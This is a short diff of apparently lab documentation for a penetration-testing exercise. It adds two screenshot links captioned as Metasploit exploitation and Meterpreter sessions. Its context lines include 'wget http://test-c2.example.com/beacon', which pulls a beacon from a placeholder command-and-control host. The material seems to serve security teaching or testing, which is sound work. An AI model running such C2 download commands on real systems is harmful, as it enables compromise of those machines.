@@ -240,6 +240,8 @@ uname -a
 wget http://test-c2.example.com/beacon
 ping -c 3 192.168.10.11
 ```
+![Metasploit Exploitation and Meterpreter Session Handshaking](./docs/images/kali-terminal-screenshot.png)
+![Metasploit Exploitation and Meterpreter Session Handshaking](./docs/images/kali-terminal-screenshot1.png)
 
 ---
 
